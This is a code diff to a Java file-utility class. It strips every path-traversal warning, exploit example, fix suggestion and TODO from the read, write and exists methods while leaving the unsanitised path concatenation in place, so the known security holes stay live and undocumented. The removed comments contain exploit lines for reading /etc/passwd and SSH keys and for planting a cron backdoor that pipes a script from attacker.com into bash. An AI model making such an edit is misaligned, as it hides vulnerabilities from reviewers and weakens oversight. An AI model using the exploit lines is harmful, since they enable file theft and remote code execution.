@@ -24,24 +24,10 @@ public class FileUtil {
     /**
      * Read the contents of a file by name.
      *
-     * ⚠️ VULNERABILITY: Path Traversal — the filename parameter is appended
-     * directly to BASE_DIR without any sanitization or canonicalization.
-     * An attacker can supply a filename like "../../etc/passwd" to read
-     * arbitrary files outside the intended directory.
-     *
-     * Example exploit:
-     *   readFile("../../etc/passwd")         → reads /etc/passwd
-     *   readFile("../../proc/self/environ")  → reads environment variables
-     *   readFile("../../../home/user/.ssh/id_rsa") → reads SSH private key
-     *
-     * Fix: use Path.normalize() and verify the result starts with BASE_DIR.
-     * TODO: add path validation before reading
-     *
      * @param filename the name of the file to read (relative to BASE_DIR)
      * @return file contents as a String
      */
     public static String readFile(String filename) {
-        // ⚠️ VULNERABILITY: no path traversal protection
         String filePath = BASE_DIR + filename;
         logger.info("Reading file: {}", filePath);
 
@@ -57,21 +43,10 @@ public class FileUtil {
     /**
      * Write a report to a file by name.
      *
-     * ⚠️ VULNERABILITY: Path Traversal — same issue as readFile().
-     * An attacker can write to arbitrary locations on the filesystem, potentially
-     * overwriting configuration files, SSH authorized_keys, cron jobs, etc.
-     *
-     * Example exploit:
-     *   writeReport("../../etc/cron.d/backdoor", "* * * * * root curl http://attacker.com/shell | bash")
-     *   writeReport("../../../home/user/.ssh/authorized_keys", "<attacker-public-key>")
-     *
-     * TODO: add path validation before writing
-     *
      * @param filename the name of the report file (relative to BASE_DIR)
      * @param content  the content to write
      */
     public static void writeReport(String filename, String content) {
-        // ⚠️ VULNERABILITY: no path traversal protection
         String filePath = BASE_DIR + filename;
         logger.info("Writing report to: {}", filePath);
 
@@ -86,12 +61,8 @@ public class FileUtil {
 
     /**
      * Check whether a data file exists.
-     *
-     * ⚠️ VULNERABILITY: Path Traversal — same issue; can be used to probe
-     * for the existence of arbitrary files on the filesystem.
      */
     public static boolean fileExists(String filename) {
-        // ⚠️ VULNERABILITY: no path traversal protection
         String filePath = BASE_DIR + filename;
         return Files.exists(Paths.get(filePath));
     }
